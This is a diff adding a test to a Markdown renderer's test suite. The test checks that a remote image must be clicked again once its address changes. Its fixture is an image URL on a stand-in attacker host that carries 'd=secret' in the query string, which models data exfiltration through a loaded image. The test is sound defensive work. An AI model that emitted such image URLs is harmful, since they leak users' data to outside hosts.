@@ -400,6 +400,19 @@ test("a picture from another site inside a link loads without following it", () 
   );
 });
 
+// A click agrees to one address, not to whatever comes to stand in its place:
+// a plan card or a live file preview changes under the reader.
+test("a picture that changes its address waits for a click again", () => {
+  const { container, rerender } = render(
+    <Markdown text="![a](https://attacker.example/a.png)" />,
+  );
+  fireEvent.click(screen.getByTestId("md-remote-media"));
+  expect(container.querySelector("img")).not.toBeNull();
+  rerender(<Markdown text="![a](https://attacker.example/b.png?d=secret)" />);
+  expect(container.querySelector("img")).toBeNull();
+  expect(screen.getByTestId("md-remote-media")).toBeTruthy();
+});
+
 test("a video from another site waits for a click", () => {
   const { container } = render(
     <Markdown text="![clip](https://attacker.example/clip.mp4)" />,
